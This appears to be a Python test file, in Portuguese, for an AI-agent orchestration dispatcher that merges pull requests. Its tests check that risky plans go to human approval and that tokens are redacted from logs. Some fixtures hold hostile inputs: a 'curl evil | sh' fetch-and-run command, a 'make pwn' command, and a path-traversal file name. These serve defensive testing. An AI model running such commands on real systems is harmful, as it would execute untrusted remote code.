    def test_nova_spec_sem_plano_anterior_cai_na_guarda_de_verificacao(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        rid = self.estado()["orquestrador"]["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertEqual(titulo, "[fábrica] orquestrador: PR do orquestrador precisa de aprovação")
        self.assertIn("verificacao", corpo)
        self.assertIn("aprovar fase", corpo)

    def test_guarda_a_arquivos_fora_da_lista_vao_para_humano(self):
        for intruso in (
            ".fabrica/config.json",
            ".fabrica/orquestrador.md",
            ".fabrica/equipes/backend.md",
            ".fabrica/raias.py",
            "src/x.ts",
            ".seeds/../src/x.ts",
            ".fabrica/plano.json.bak",
            ".github/workflows/ci.yml",
        ):
            with self.subTest(intruso=intruso):
                self.setUp()
                d, rid = self.acordar_por_falha()
                self.pr_do_orquestrador(
                    rid, [".fabrica/plano.json", intruso], plano(raia("a", plano_seeds="pl-00aa"))
                )
                d.ciclo()
                self.assertEqual(self.forja.merges, [])
                ((titulo, corpo),) = self.forja.decisoes
                self.assertEqual(titulo, "[fábrica] orquestrador: PR do orquestrador precisa de aprovação")
                self.assertIn(intruso, corpo)

    def test_guarda_b_verificacao_alterada_vai_para_humano(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(
            rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa", verificacao="curl evil | sh"))
        )
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((_, corpo),) = self.forja.decisoes
        self.assertIn("raia a", corpo)

    def test_guarda_b_raia_nova_com_comando_novo_vai_para_humano(self):
        d, rid = self.acordar_por_falha()
        novo_plano = plano(raia("a"), raia("c", plano_seeds="pl-000c", verificacao="make pwn"))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], novo_plano)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((_, corpo),) = self.forja.decisoes
        self.assertIn("make pwn", corpo)

    def test_guarda_b_raia_nova_com_comando_conhecido_mergeia(self):
        d, rid = self.acordar_por_falha()
        novo_plano = plano(raia("a"), raia("c", plano_seeds="pl-000c", verificacao="pnpm test"))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], novo_plano)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])

    def test_plano_invalido_acorda_replanejamento_uma_vez(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", papel="hacker")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(self.forja.decisoes, [])
        orqs = self.runs(FABLE)
        self.assertEqual(len(orqs), 2)
        self.assertIn("Motivo: plano_invalido", orqs[-1]["prompt"])
        self.assertIn("papel inválido", orqs[-1]["prompt"])
        self.assertIn("plano_invalido:orquestrador", self.estado()["chavesAcordadas"])
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)

    def test_run_sem_pr_acorda_plano_invalido_uma_vez(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()
        orqs = self.runs(FABLE)
        self.assertEqual(len(orqs), 2)
        self.assertIn("Motivo: plano_invalido", orqs[-1]["prompt"])
        self.assertIn("run do orquestrador terminou sem PR", orqs[-1]["prompt"])
        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertEqual(self.forja.decisoes, [])

    def test_pergunta_abre_decisao_sem_merge_e_a_resposta_acorda(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(
            rid,
            [".fabrica/pergunta.md", ".fabrica/plano.json"],
            plano(raia("a", plano_seeds="pl-00aa")),
            pergunta="Qual banco usar: Postgres ou SQLite?",
        )
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertIn("pergunta", titulo)
        self.assertIn("Qual banco usar: Postgres ou SQLite?", corpo)
        self.assertIn(PR_ORQ, corpo)
        (decisao,) = self.estado()["decisoes"]
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="Postgres.")
        d.ciclo()
        orq = self.runs(FABLE)[-1]
        self.assertIn("Motivo: resposta_paulo", orq["prompt"])
        self.assertIn("Qual banco usar: Postgres ou SQLite?", orq["prompt"])
        self.assertIn("Postgres.", orq["prompt"])

    def test_pr_em_outro_repositorio_nunca_e_mergeado(self):
        d, rid = self.acordar_por_falha()
        outro = "https://github.com/intruso/cliente/pull/3"
        self.motor.definir_run(rid, estado="succeeded", prUrl=outro)
        self.forja.definir_pr(outro, head_sha=H3, branch="x", arquivos=[".fabrica/plano.json"])
        self.forja.definir_arquivo("intruso/cliente", H3, ".fabrica/plano.json", json.dumps(plano(raia("a"))))
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(len(self.forja.decisoes), 1)

    def test_falha_ao_tratar_o_pr_tenta_de_novo_sem_concluir(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded", prUrl=PR_ORQ)  # PR ainda desconhecido na forja
        d.ciclo()
        self.assertEqual(self.estado()["orquestrador"]["runId"], rid)
        self.assertEqual(self.forja.merges, [])
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertIsNone(self.estado()["orquestrador"]["runId"])

    def test_plano_e_lido_no_sha_do_head_e_nao_no_branch(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        self.publicar(plano(raia("a", verificacao="curl evil | sh")), ref="warren/orq")
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        lidos = [a["ref"] for n, a in self.forja.chamadas if n == "arquivo" and a["caminho"] == ".fabrica/plano.json"]
        self.assertIn(H3, lidos)
        self.assertNotIn("warren/orq", lidos)


# ---------------------------------------------------------------- iniciar e CLI


class TestesIniciar(Base):
    def test_iniciar_sem_spec_usa_o_plano_valido_e_nao_acorda(self):
        self.publicar(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d = self.novo()
        d.iniciar()
        disco = self.estado()
        self.assertEqual(disco["projeto"], PROJETO)
        self.assertEqual(disco["repo"], REPO)
        self.assertEqual(disco["limiteParalelo"], 3)
        self.assertEqual({k: v["estado"] for k, v in disco["raias"].items()}, {"a": "planejada", "b": "planejada"})
        self.assertEqual(self.runs(), [])
        self.assertEqual(self.acordadas(), [])
        self.assertEqual(json.loads((self.raiz / "plano.json").read_text(encoding="utf-8"))["faseAtual"], "f1")

    def test_iniciar_sem_spec_com_plano_invalido_ou_ausente_recusa(self):
        for conteudo in (None, "{nao json", json.dumps(plano(raia("a", papel="hacker")))):
            with self.subTest(conteudo=conteudo):
                self.setUp()
                if conteudo is not None:
                    self.publicar(conteudo)
                d = self.novo()
                with self.assertRaises(despachante.ErroDeEntrada) as ctx:
                    d.iniciar()
                self.assertTrue(ctx.exception.erros)
                self.assertFalse((self.raiz / "estado.json").exists())

    def test_cli_iniciar_sem_spec_invalido_sai_com_2_e_lista_os_erros(self):
        self.publicar(plano(raia("a", papel="hacker")))
        saida, erro = io.StringIO(), io.StringIO()
        codigo = despachante.main(
            ["iniciar"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, construir=lambda amb: self.novo(), saida=saida, erro=erro
        )
        self.assertEqual(codigo, 2)
        self.assertIn("papel inválido", erro.getvalue())

    def test_iniciar_com_spec_inexistente_nao_acorda(self):
        d = self.novo()
        with self.assertRaises(despachante.ErroDeEntrada):
            d.iniciar(spec="docs/nao-existe.md")
        self.assertEqual(self.runs(), [])

    def test_iniciar_com_spec_repetida_nao_acorda_de_novo(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        rid = self.estado()["orquestrador"]["runId"]
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()  # sem PR: acorda plano_invalido
        n = len(self.runs(FABLE))
        outro = self.novo()
        outro.iniciar(spec="docs/spec.md")
        self.assertEqual(len(self.runs(FABLE)), n)

    def test_cli_iniciar_com_spec_acorda(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        codigo = despachante.main(
            ["iniciar", "--spec", "docs/spec.md"],
            ambiente={"FABRICA_RAIZ": str(self.raiz)},
            construir=lambda amb: self.novo(),
            saida=io.StringIO(),
            erro=io.StringIO(),
        )
        self.assertEqual(codigo, 0)
        self.assertEqual(len(self.runs(FABLE)), 1)

    def test_cli_status_e_retomar(self):
        self.publicar(plano(raia("a")))
        self.novo().iniciar()
        disco = self.estado()
        disco["pausado"] = "acordar falhou"
        disco["falhasAcordar"] = 3
        (self.raiz / "estado.json").write_text(json.dumps(disco), encoding="utf-8")
        saida = io.StringIO()
        self.assertEqual(despachante.main(["status"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, saida=saida), 0)
        self.assertIn("a: planejada", saida.getvalue())
        self.assertIn("acordar falhou", saida.getvalue())
        self.assertEqual(
            despachante.main(["retomar"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, saida=io.StringIO()), 0
        )
        disco = self.estado()
        self.assertIsNone(disco["pausado"])
        self.assertEqual(disco["falhasAcordar"], 0)
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "retomar"]
        self.assertEqual(linha["antes"], {"pausado": "acordar falhou", "falhasAcordar": 3})

    def test_cli_sem_raiz_sai_com_2(self):
        erro = io.StringIO()
        self.assertEqual(despachante.main(["status"], ambiente={}, saida=io.StringIO(), erro=erro), 2)
        self.assertIn("FABRICA_RAIZ", erro.getvalue())

    def test_cli_status_em_processo_isolado(self):
        self.publicar(plano(raia("a")))
        self.novo().iniciar()
        r = subprocess.run(
            [sys.executable, "-I", "-B", str(SCRIPT), "status"],
            env={"FABRICA_RAIZ": str(self.raiz), "PATH": os.environ.get("PATH", "")},
            capture_output=True,
            text=True,
            timeout=30,
        )
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("a: planejada", r.stdout)

    def test_construcao_real_le_tokens_dos_arquivos_e_config_do_repo(self):
        (self.repo_dir / ".fabrica").mkdir()
        (self.repo_dir / ".fabrica" / "config.json").write_text(json.dumps(CONFIG), encoding="utf-8")
        (self.tmp / "w").write_text(TOKEN + "\n", encoding="utf-8")
        (self.tmp / "g").write_text(TOKEN_GH + "\n", encoding="utf-8")
        ambiente = {
            "FABRICA_RAIZ": str(self.raiz),
            "FABRICA_REPO_DIR": str(self.repo_dir),
            "FABRICA_PROJETO": PROJETO,
            "FABRICA_REPO": REPO,
            "WARREN_TOKEN_FILE": str(self.tmp / "w"),
            "GH_TOKEN_FILE": str(self.tmp / "g"),
        }
        d = despachante.construir(ambiente)
        self.assertEqual(type(d.motor).__name__, "MotorWarren")
        self.assertEqual(type(d.forja).__name__, "ForjaGitHub")
        self.assertEqual(d.motor._base, "http://127.0.0.1:8080")
        self.assertEqual(d.config["branchPadrao"], "main")
        for faltando in ("FABRICA_REPO_DIR", "FABRICA_PROJETO", "FABRICA_REPO"):
            with self.subTest(faltando=faltando):
                with self.assertRaises(despachante.ErroDeEntrada) as ctx:
                    despachante.construir({k: v for k, v in ambiente.items() if k != faltando})
                self.assertIn(faltando, ctx.exception.erros[0])


# ---------------------------------------------------------------- config


class TestesConfig(Base):
    def test_config_invalida_e_recusada_na_construcao(self):
        casos = {
            "sem protegidos": {k: v for k, v in CONFIG.items() if k != "protegidos"},
            "protegido vazio": dict(CONFIG, protegidos=[""]),
            "sem revisor": dict(CONFIG, modelos={k: v for k, v in CONFIG["modelos"].items() if k != "revisor"}),
            "custo zero": dict(CONFIG, modelos=dict(CONFIG["modelos"], fixer=_modelo(HAIKU, 0))),
            "custo bool": dict(CONFIG, modelos=dict(CONFIG["modelos"], fixer=_modelo(HAIKU, True))),
            "verificacao": dict(CONFIG, verificacao={"imagem": "x", "env": {"GH_TOKEN": "a"}}),
            "sem verificacao": {k: v for k, v in CONFIG.items() if k != "verificacao"},
            "limite": dict(CONFIG, limiteParalelo=0),
        }
        for nome, config in casos.items():
            with self.subTest(nome=nome):
                with self.assertRaises(despachante.ConfigInvalida):
                    self.novo(config=config)

    def test_f_iniciar_recusa_papel_do_plano_sem_modelo(self):
        config = dict(CONFIG, modelos={k: v for k, v in CONFIG["modelos"].items() if k != "qa"})
        self.publicar(plano(raia("a", papel="qa")))
        d = self.novo(config=config)
        with self.assertRaises(despachante.ConfigInvalida) as ctx:
            d.iniciar()
        self.assertIn("qa", str(ctx.exception))
        self.assertFalse((self.raiz / "estado.json").exists())

    def test_n1_plano_adotado_com_papel_sem_modelo_nao_derruba_o_reinicio(self):
        """Sonda p_f_crashloop: com Restart=always, uma exceção na partida seria um loop eterno."""
        config = dict(CONFIG, modelos={k: v for k, v in CONFIG["modelos"].items() if k != "qa"})
        self.config_padrao = config
        d, rid = self.acordar_por_falha()
        novo_plano = plano(raia("a", plano_seeds="pl-000b"), raia("q", papel="qa", plano_seeds="pl-000c", arquivos=["e2e/"]))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], novo_plano)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])  # o PR com papel sem modelo vai para o Paulo
        self.assertTrue(any("papéis sem modelo" in c and "qa" in c for _, c in self.forja.decisoes))
        self.publicar(novo_plano)  # o Paulo mergeou assim mesmo
        d.ciclo()
        d.ciclo()
        self.assertIn("q", [x["alvo"] for x in self.estado()["decisoes"]])
        outro = self.novo()  # reinício: não lança
        with mock.patch.object(despachante.Despachante, "ciclo", side_effect=KeyboardInterrupt):
            codigo = despachante.main(
                ["rodar"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, construir=lambda amb: self.novo(), saida=io.StringIO(), erro=io.StringIO()
            )
        self.assertEqual(codigo, 0)
        self.assertIsNotNone(outro.estado)

    def test_f_raia_nao_despachavel_nao_segura_a_vaga_e_abre_uma_decisao(self):
        config = dict(CONFIG, limiteParalelo=1, modelos={k: v for k, v in CONFIG["modelos"].items() if k != "qa"})
        self.publicar(plano(raia("b", plano_seeds="pl-000b")))
        d = self.novo(config=config)
        d.iniciar()
        self.publicar(plano(raia("q", papel="qa", plano_seeds="pl-000c"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()
        d.ciclo()
        (despacho,) = self.planos_despachados()
        self.assertEqual(despacho["plano_seeds"], "pl-000b")
        titulos = [t for t, _ in self.forja.decisoes]
        self.assertEqual(titulos, ["[fábrica] raia q: não pode ser despachada"])
        self.assertIn("modelos.qa", self.forja.decisoes[0][1])
        self.assertEqual(self.estado()["raias"]["q"]["estado"], "planejada")
        self.assertEqual(self.estado()["decisoes"][-1]["alvo"], "q")
        # o Paulo responde; enquanto a raia continuar sem modelo, nenhuma issue nova é aberta
        self.forja.definir_decisao(self.estado()["decisoes"][-1]["url"], fechada=True, ultimo_comentario="vou ajustar a config")
        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.forja.decisoes), 1)

    def test_ux_engineer_usa_o_modelo_de_ux_ui(self):
        config = copy.deepcopy(CONFIG)
        config["modelos"]["ux-ui"] = _modelo("modelo-ux", 7)
        self.publicar(plano(raia("a", papel="ux-engineer")))
        d = self.novo(config=config)
        d.iniciar()
        d.ciclo()
        (despacho,) = self.planos_despachados()
        self.assertEqual((despacho["modelo"], despacho["max_custo_usd"]), ("modelo-ux", 7))

    def test_protegidos_fixos_valem_mesmo_fora_da_config(self):
        config = dict(CONFIG, protegidos=["**/migrations/**"])
        self.publicar(plano(raia("a")))
        d = self.novo(config=config)
        d.iniciar()
        d.ciclo()
        self.abrir_pr(H1, arquivos=("src/a/x.ts", ".github/workflows/ci.yml"))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((_, corpo),) = self.forja.decisoes
        self.assertIn(".github/workflows/ci.yml", corpo)

    def test_plano_invalido_no_branch_nao_substitui_o_anterior(self):
        d = self.preparar_raia()
        self.publicar(plano(raia("a"), raia("a")))
        d.ciclo()
        self.assertEqual(len(json.loads((self.raiz / "plano.json").read_text(encoding="utf-8"))["raias"]), 1)
        self.assertTrue(any("inválido" in a for a in self.estado()["avisos"]))


# ---------------------------------------------------------------- observação


class TestesObservacao(Base):
    def test_falha_ao_ler_o_ci_impede_qualquer_acao_da_seed(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        self.mover_head(H1)
        self.forja._ci.clear()  # o GitHub falha ao responder o CI
        acoes = d.ciclo()
        self.assertEqual(acoes, [])
        self.assertEqual(self.forja.merges, [])

    def test_pr_de_outro_repositorio_nao_e_observado(self):
        d = self.preparar_raia()
        outro = "https://github.com/intruso/cliente/pull/1"
        self.motor.definir_plano(
            "plano-1", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r", "prUrl": outro}]
        )
        self.forja.definir_pr(outro, head_sha=H1, branch="x", arquivos=["src/a/x.ts"])
        self.forja.definir_ci("intruso/cliente", H1, "verde")
        self.assertEqual(d.ciclo(), [])
        self.assertEqual(self.runs(), [])
        self.assertTrue(any("intruso/cliente" in a for a in self.estado()["avisos"]))

    def test_pr_fechado_nao_recebe_acoes(self):
        d = self.preparar_raia()
        self.motor.definir_plano(
            "plano-1", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r", "prUrl": PR}]
        )
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-1", arquivos=["src/a/x.ts"], aberto=False)
        self.forja.definir_ci(REPO, H1, "verde")
        self.assertEqual(d.ciclo(), [])
        self.assertEqual(self.runs(), [])

    def test_falha_ao_abrir_decisao_nao_perde_a_escalada(self):
        class ForjaQueFalhaUmaVez(forja.ForjaFalsa):
            falhou = False

            def abrir_decisao(self, repo, titulo, corpo):
                if not self.falhou:
                    self.falhou = True
                    raise RuntimeError("POST /issues: HTTP 502")
                return super().abrir_decisao(repo, titulo, corpo)

        self.forja = ForjaQueFalhaUmaVez()
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        self.assertNotEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
        d.ciclo()
        self.assertEqual(len(self.forja.decisoes), 1)
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")

    def test_merge_so_com_o_head_observado(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        d._executar({"tipo": "mergear", "seed": "s-1", "sha": H2})
        self.assertEqual([n for n, _ in self.forja.chamadas if n == "mergear"], [])
        self.assertEqual(self.forja.merges, [])

    def test_merge_recusado_conta_e_escala_na_terceira(self):
        class ForjaQueRecusa(forja.ForjaFalsa):
            def mergear(self, url, sha):
                self._registrar("mergear", url=url, sha=sha)
                return False

        self.forja = ForjaQueRecusa()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        d.ciclo()
        d.ciclo()
        d.ciclo()
        tentativas = [a for n, a in self.forja.chamadas if n == "mergear"]
        self.assertEqual(len(tentativas), 3)
        self.assertEqual(len(self.forja.decisoes), 1)


# ---------------------------------------------------------------- modelo efetivo


class TestesModeloEfetivo(Base):
    AVISO_REVISOR = (
        f"papel revisor rodou em {SONNET}, configurado {OPUS}: o Warren não aplicou o modelo (rode preparar-warren)"
    )

    def test_divergencia_do_revisor_avisa_uma_vez_e_nao_reexecuta(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.terminar_revisao(H1, resultado="correcoes", achados=[{"arquivo": "src/a/x.ts", "motivo": "bug"}])
        self.motor.definir_modelo_efetivo(rid, SONNET)
        d.ciclo()  # corrige
        fid = self.estado()["seeds"]["s-1"]["fixerRunId"]
        self.motor.definir_run(fid, estado="succeeded")
        self.mover_head(H2)
        d.ciclo()
        rid2 = self.terminar_revisao(H2)
        self.motor.definir_modelo_efetivo(rid2, SONNET)
        d.ciclo()
        avisos = [a for a in self.estado()["avisos"] if a == self.AVISO_REVISOR]
        self.assertEqual(len(avisos), 1)
        logados = [linha for linha in self.log() if linha.get("mensagem") == self.AVISO_REVISOR]
        self.assertEqual(len(logados), 1)
        self.assertEqual(len(self.runs(OPUS)), 2)  # nenhuma revisão extra por causa do modelo
        self.assertEqual(self.forja.merges, [(PR, H2)])

    def test_modelo_igual_nao_avisa(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.terminar_revisao(H1)
        self.motor.definir_modelo_efetivo(rid, OPUS)
        d.ciclo()
        self.assertFalse(any("rodou em" in a for a in self.estado()["avisos"]))
        self.assertIn(("modelo_efetivo", {"run_id": rid}), self.motor.chamadas)

    def test_filho_do_plan_run_e_orquestrador_sao_conferidos(self):
        self.motor.definir_modelo_efetivo("run-filho", HAIKU)
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        d.ciclo()
        esperado = (
            f"papel backend rodou em {HAIKU}, configurado {SONNET}: o Warren não aplicou o modelo (rode preparar-warren)"
        )
        self.assertEqual(self.estado()["avisos"].count(esperado), 1)
        conferencias = [a for n, a in self.motor.chamadas if n == "modelo_efetivo" and a["run_id"] == "run-filho"]
        self.assertEqual(len(conferencias), 1)

        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d.iniciar(spec="docs/spec.md")
        orq = self.estado()["orquestrador"]["runId"]
        self.motor.definir_modelo_efetivo(orq, OPUS)
        self.motor.definir_run(orq, estado="succeeded")
        d.ciclo()
        self.assertIn(
            f"papel orquestrador rodou em {OPUS}, configurado {FABLE}: o Warren não aplicou o modelo (rode preparar-warren)",
            self.estado()["avisos"],
        )

    def test_erro_ao_ler_o_modelo_nao_atrapalha(self):
        class MotorSemEventos(motor.MotorFalso):
            def modelo_efetivo(self, run_id):
                raise RuntimeError("GET /runs/x/events: HTTP 500")

        self.motor = MotorSemEventos()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])


# ---------------------------------------------------------------- rodar, logs e segredos


class TestesRodarELogs(Base):
    def test_limpar_residuos_uma_vez_na_partida_com_contagens_no_log(self):
        d = self.preparar_raia()
        sonos = []
        d.rodar(intervalo=5, ciclos=3, dormir=sonos.append)
        self.assertEqual(len(self.limpezas), 1)
        self.assertEqual(sonos, [5, 5])
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "limpar_residuos"]
        self.assertEqual((linha["conteineres"], linha["redes"], linha["diretorios"]), (2, 1, 0))

    def test_cli_rodar_limpa_sob_a_trava(self):
        d = self.preparar_raia()
        estados_da_trava = []

        def limpar():
            try:
                with despachante.travar(self.raiz):
                    estados_da_trava.append("livre")
            except despachante.OutroDespachante:
                estados_da_trava.append("tomada")
            return {"conteineres": 0, "redes": 0, "diretorios": 0, "erros": []}

        d._limpar = limpar
        with mock.patch.object(despachante.Despachante, "ciclo", side_effect=KeyboardInterrupt):
            codigo = despachante.main(
                ["rodar"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, construir=lambda amb: d, saida=io.StringIO()
            )
        self.assertEqual(codigo, 0)
        self.assertEqual(estados_da_trava, ["tomada"])

    def test_retry_after_negativo_vira_zero_e_positivo_estende_a_espera(self):
        for retry, esperado in ((-50, 7), (60, 60)):
            with self.subTest(retry=retry):
                self.setUp()
                self.publicar(plano(raia("a")))
                d = self.novo()
                d.iniciar()
                self.motor.lotar(retry)
                sonos = []
                d.rodar(intervalo=7, ciclos=2, dormir=sonos.append)
                self.assertEqual(sonos, [esperado])
                linha = [linha for linha in self.log() if linha.get("evento") == "acao"][0]
                self.assertEqual(linha["resultado"], {"adiado": True, "retryAfter": max(0, retry)})

    def test_nenhum_token_nem_traceback_no_log_no_estado_ou_avisos(self):
        class MotorQueVaza(motor.MotorFalso):
            def despachar_plano(self, **argumentos):
                try:
                    raise ValueError("causa interna com " + TOKEN)
                except ValueError as causa:
                    raise RuntimeError(f"falhou com Bearer {TOKEN} e {TOKEN_GH}") from causa

        self.motor = MotorQueVaza()
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.rodar(intervalo=0, ciclos=1, dormir=lambda s: None)
        textos = [(self.raiz / nome).read_text(encoding="utf-8") for nome in ("log.jsonl", "estado.json")]
        for texto in textos:
            self.assertNotIn(TOKEN, texto)
            self.assertNotIn(TOKEN_GH, texto)
            self.assertNotIn("Traceback", texto)
            self.assertNotIn("causa interna", texto)
            self.assertNotIn("ValueError", texto)
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "acao"]
        self.assertTrue(linha["erro"].startswith("RuntimeError: falhou com Bearer ***"))
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")

    def test_erro_no_ciclo_vira_uma_linha_de_log_e_o_laco_segue(self):
        d = self.preparar_raia()
        chamadas = []

        def ciclo_quebrado():
            chamadas.append(1)
            raise RuntimeError("quebrou com " + TOKEN)

        d.ciclo = ciclo_quebrado
        d.rodar(intervalo=0, ciclos=2, dormir=lambda s: None)
        self.assertEqual(len(chamadas), 2)
        erros = [linha for linha in self.log() if linha.get("evento") == "erro_no_ciclo"]
        self.assertEqual(len(erros), 2)
        self.assertEqual(erros[0]["erro"], "RuntimeError: quebrou com ***")

    def test_redacao_vale_para_mensagens_e_para_a_linha_do_log(self):
        segredo_com_aspas = 'abc"def\\ghij'
        d = self.novo(segredos=(TOKEN, segredo_com_aspas, "curto"))
        self.assertEqual(d._erro(RuntimeError("x " + TOKEN)), "RuntimeError: x ***")
        self.assertEqual(d._seguro("y " + segredo_com_aspas), "y ***")
        self.assertEqual(d._seguro("curto"), "curto")  # segredos curtos demais não são redigidos
        d._log({"campo": TOKEN, "outro": segredo_com_aspas})
        bruto = (self.raiz / "log.jsonl").read_text(encoding="utf-8")
        self.assertNotIn(TOKEN, bruto)
        self.assertNotIn(json.dumps(segredo_com_aspas)[1:-1], bruto)
        self.assertNotIn(segredo_com_aspas, bruto)

    def test_aviso_de_acao_nao_executada_nao_leva_token_ao_estado_nem_a_issue(self):
        self.publicar(plano(raia("a", papel="qa")))
        d = self.novo()
        d.iniciar()
        d._modelo = lambda papel: (_ for _ in ()).throw(despachante.ConfigInvalida("modelos.qa " + TOKEN))
        d.ciclo()
        texto = (self.raiz / "estado.json").read_text(encoding="utf-8")
        self.assertNotIn(TOKEN, texto)
        self.assertIn("modelos.qa ***", texto)
        ((titulo, corpo),) = self.forja.decisoes
        self.assertNotIn(TOKEN, titulo + corpo)
        self.assertIn("modelos.qa ***", corpo)

    def test_ciclo_sem_estado_pede_iniciar(self):
        d = self.novo()
        with self.assertRaises(despachante.ErroDeEntrada):
            d.ciclo()


# ---------------------------------------------------------------- rodada 1 (itens A–I)

TITULO_SEM_PLANO = "[fábrica] orquestrador: sem plano válido"


class MotorLeituraFalha(motor.MotorFalso):
    """Leituras (run/plano) de ids escolhidos falham; `todos` faz todas falharem."""

    def __init__(self):
        super().__init__()
        self.falhando = set()
        self.todos = False

    def run(self, run_id):
        if self.todos or run_id in self.falhando:
            self._registrar("run", run_id=run_id)
            raise RuntimeError("GET /runs/%s: HTTP 500" % run_id)
        return super().run(run_id)

    def plano(self, plan_run_id):
        if self.todos or plan_run_id in self.falhando:
            self._registrar("plano", plan_run_id=plan_run_id)
            raise RuntimeError("GET /plan-runs/%s: HTTP 500" % plan_run_id)
        return super().plano(plan_run_id)


class TestesA_CadeiaDoOrquestrador(Base):
    def terminar_sem_pr(self, d, ciclos=8):
        for _ in range(ciclos):
            rid = self.orquestrador()["runId"]
            if rid:
                self.motor.definir_run(rid, estado="succeeded")
            d.ciclo()

    def test_sem_pr_para_em_dois_runs_e_abre_uma_decisao(self):
        d, _ = self.acordar_por_falha()
        self.terminar_sem_pr(d)
        self.assertEqual(len(self.runs(FABLE)), 2)
        decisoes = [(t, c) for t, c in self.forja.decisoes if t == TITULO_SEM_PLANO]
        self.assertEqual(len(decisoes), 1)
        self.assertIn("2 vezes seguidas", decisoes[0][1])
        self.assertIn("run do orquestrador terminou sem PR", decisoes[0][1])
        orq = self.orquestrador()
        self.assertIsNone(orq["runId"])
        self.assertEqual(orq["semResultadoSeguidos"], 2)
        # só a resposta do Paulo volta a acordar o orquestrador, e ela zera o contador
        url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "bloqueio"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="Divida a raia a em duas.")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 3)
        self.assertIn("Motivo: resposta_paulo", self.runs(FABLE)[-1]["prompt"])
        self.assertIn("Divida a raia a em duas.", self.runs(FABLE)[-1]["prompt"])
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 0)

    def test_plano_invalido_em_cadeia_tambem_para_e_os_prs_sao_fechados(self):
        d, _ = self.acordar_por_falha()
        urls = []
        for i in range(6):
            rid = self.orquestrador()["runId"]
            if rid:
                url = "https://github.com/dono/cliente/pull/%d" % (100 + i)
                urls.append(url)
                self.pr_do_orquestrador(
                    rid, [".fabrica/plano.json"], '{"versao": 1, "raias": "x"}', head=_gerar_head(100 + i), url=url
                )
            d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
